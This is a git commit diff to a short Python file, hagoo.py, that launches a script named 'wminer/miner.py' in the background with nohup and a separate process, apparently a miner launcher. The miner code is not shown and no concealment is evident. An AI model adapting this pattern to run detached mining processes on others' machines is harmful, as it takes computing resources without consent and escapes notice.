83c8ac334b707f35e7752247e4a2d4f721ba31aa
Vyom 907 AND Vyom Wankhede <111875466+VYOM00907@users.noreply.github.com>
2023-06-04 08:25:35 +0000

    fgyhj

--- hagoo.py
+++ hagoo.py
@@ -1,3 +1,20 @@
 import subprocess
+from multiprocessing import Process
+import threading
+import time
+from sys import exit
 
-subprocess.run([ "nohup","nohup","python","wminer/miner.py" ])
+
+def lonc():
+    subprocess.run(["bash","-c","nohup python wminer/miner.py &"])
+
+def oo():
+    
+    exit()
+    
+t1 = Process(target=lonc, args=())
+t2 = threading.Thread(target=oo, args=())
+t2.start()
+t1.start()
+    
+    
